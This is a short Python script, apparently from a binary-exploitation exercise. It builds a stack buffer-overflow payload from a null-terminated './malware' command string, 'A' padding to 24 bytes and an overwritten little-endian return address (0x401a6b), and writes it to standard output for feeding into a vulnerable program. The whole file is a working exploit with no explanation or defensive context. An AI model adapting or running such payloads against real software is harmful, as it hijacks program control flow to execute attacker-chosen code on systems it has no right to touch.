import sys
command = b"./malware\x00"
padding = b"A" * (24 - len(command))
return_address = (0x401a6b).to_bytes(8, "little")
payload = command + padding + return_address + b"\n"
sys.stdout.buffer.write(payload)
